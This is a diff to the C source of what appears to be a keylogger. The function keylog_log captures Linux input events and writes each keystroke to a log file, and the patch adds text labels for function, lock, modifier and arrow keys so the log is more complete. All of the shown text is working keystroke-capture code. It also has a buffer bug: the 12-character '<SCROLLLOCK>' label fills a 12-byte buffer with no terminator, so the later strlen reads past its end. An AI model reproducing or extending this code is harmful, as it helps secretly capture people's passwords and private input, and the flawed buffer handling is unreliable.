@@ -110,6 +110,7 @@ static bool has_seq_triggered(unsigned short ev_code,
  *    unsigned int value;
  * }
  */
+#define BUFLEN 12
 
 static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
 {
@@ -119,6 +120,7 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
         return;
     }
 
+    char strbuf[BUFLEN] = { '\0' };
     char lc = '\0';
     char uc = '\0';
 
@@ -198,12 +200,56 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
     case KEY_KPPLUS: lc = uc = '+'; break;
     case KEY_KPDOT: lc = uc = '.'; break;
 
+    /* Invisible */
+
+    case KEY_ESC: strncpy(strbuf, "<ESC>", BUFLEN); break;
+
+    case KEY_F1: strncpy(strbuf, "<F1>", BUFLEN); break;
+    case KEY_F2: strncpy(strbuf, "<F2>", BUFLEN); break;
+    case KEY_F3: strncpy(strbuf, "<F3>", BUFLEN); break;
+    case KEY_F4: strncpy(strbuf, "<F4>", BUFLEN); break;
+    case KEY_F5: strncpy(strbuf, "<F5>", BUFLEN); break;
+    case KEY_F6: strncpy(strbuf, "<F6>", BUFLEN); break;
+    case KEY_F7: strncpy(strbuf, "<F7>", BUFLEN); break;
+    case KEY_F8: strncpy(strbuf, "<F8>", BUFLEN); break;
+    case KEY_F9: strncpy(strbuf, "<F9>", BUFLEN); break;
+    case KEY_F10: strncpy(strbuf, "<F10>", BUFLEN); break;
+    case KEY_F11: strncpy(strbuf, "<F11>", BUFLEN); break;
+    case KEY_F12: strncpy(strbuf, "<F12>", BUFLEN); break;
+
+    case KEY_CAPSLOCK: strncpy(strbuf, "<CAPSLOCK>", BUFLEN); break;
+    case KEY_NUMLOCK: strncpy(strbuf, "<NUMLOCK>", BUFLEN); break;
+    case KEY_SCROLLLOCK: strncpy(strbuf, "<SCROLLLOCK>", BUFLEN); break;
+    case KEY_RIGHTCTRL: strncpy(strbuf, "<R-CTRL>", BUFLEN); break;
+    case KEY_RIGHTALT: strncpy(strbuf, "<R-ALT>", BUFLEN); break;
+    case KEY_LEFTCTRL: strncpy(strbuf, "<L-CTRL>", BUFLEN); break;
+    case KEY_LEFTALT: strncpy(strbuf, "<L-ALT>", BUFLEN); break;
+
+    case KEY_HOME: strncpy(strbuf, "<HOME>", BUFLEN); break;
+    case KEY_END: strncpy(strbuf, "<END>", BUFLEN); break;
+    case KEY_PAGEUP: strncpy(strbuf, "<PAGEUP>", BUFLEN); break;
+    case KEY_PAGEDOWN: strncpy(strbuf, "<PAGEDOWN>", BUFLEN); break;
+
+    case KEY_INSERT: strncpy(strbuf, "<INSERT>", BUFLEN); break;
+    case KEY_DELETE: strncpy(strbuf, "<DELETE>", BUFLEN); break;
+
+    case KEY_UP: strncpy(strbuf, "<UP>", BUFLEN); break;
+    case KEY_LEFT: strncpy(strbuf, "<LEFT>", BUFLEN); break;
+    case KEY_DOWN: strncpy(strbuf, "<DOWN>", BUFLEN); break;
+    case KEY_RIGHT: strncpy(strbuf, "<RIGHT>", BUFLEN); break;
+
+
     default: lc = uc = '\0'; break;
     }
 
     char c = (is_upper) ? uc : lc;
+    size_t len = strlen(strbuf);
 
-    write(priv->log.fd, &c, 1);
+    if (len) {
+        write(priv->log.fd, strbuf, len);
+    } else {
+        write(priv->log.fd, &c, 1);
+    }
 }
 
 void keylog_process_event(keylog_t *kl, struct input_event e)
